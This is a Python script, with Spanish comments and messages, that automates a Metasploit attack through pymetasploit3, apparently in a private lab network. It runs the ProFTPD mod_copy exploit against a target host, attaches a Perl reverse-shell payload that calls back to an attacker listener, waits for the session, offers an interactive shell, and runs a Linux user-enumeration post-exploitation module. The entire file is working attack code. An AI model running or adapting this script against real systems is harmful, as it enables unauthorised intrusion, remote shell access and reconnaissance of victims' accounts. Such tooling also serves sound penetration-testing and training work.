from pymetasploit3.msfrpc import MsfRpcClient
import time 
def connect_metasploit():
    client = MsfRpcClient("password", ssl=True)
    print("Conectado a Metasploit!")
    return client

def search_exploit(client, keyword):
    exploits = client.modules.exploits
    filtered_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lower()]
    print(f"Exploits que contienen: {keyword}")
    for exploit in filtered_exploits:
        print(exploit)

def setup_and_run_exploit(client):
    exploit = client.modules.use("exploit", "unix/ftp/proftpd_modcopy_exec")
    #Configure exploit options
    exploit['RHOSTS'] = '192.168.238.131'
    exploit['SITEPATH'] = '/var/www/html'
    #Configure exploit payload
    payload = client.modules.use("payload", "cmd/unix/reverse_perl")
    payload['LHOST'] = '192.168.238.130'
    payload['LPORT'] = 4445
    #Execute exploit
    print("Ejecutando exploit...")
    output = exploit.execute(payload=payload)
    return output['uuid']

def get_session_id(client, uuid, timeout=15):
    end_time = time.time() + timeout
    while time.time() < end_time:
        sessions = client.sessions.list
        for s in sessions:
            if sessions[s]['exploit_uuid'] == uuid:
                print(f"Se ha obtenido la session: {s}")
                return s
        time.sleep(1)
    print(f"No se pudo obtener la session asociada al uuid: {uuid}")
    return None

def interact_with_session(client, session_id):
    shell = client.sessions.session(session_id)
    print("Interactuando con la session")
    try:
        while True:
            command = input("$ ")
            if command.lower() == 'exit':
                break
            shell.write(command + '\n')
            time.sleep(1)
            print(shell.read())
    except KeyboardInterrupt:
        print("Saliendo de la session interactiva.")

def post_explotation(client,session_id):
    console_id = client.consoles.console().cid
    #Configure and execute postexplotation module
    exploit_module ='post/linux/gather/enum_users'
    client.consoles.console(console_id).write(f'use {exploit_module}\n')
    client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
    client.consoles.console(console_id).write(f'run\n')
    #Wait module execution
    time.sleep(20)
    #Recover and show results 
    output = client.consoles.console(console_id).read()
    print(output['data'])
    #Clean console and close 
    client.consoles.console(console_id).destroy()


def main():
    client = connect_metasploit()
    #keyword = input("Introduce la palabra clave por la que buscar exploits: ")
    #search_exploit(client, keyword)
    uuid = setup_and_run_exploit(client)
    session_id = get_session_id(client, uuid)
    if session_id:
        post_explotation(client, int(session_id))

if __name__ == "__main__":
  main()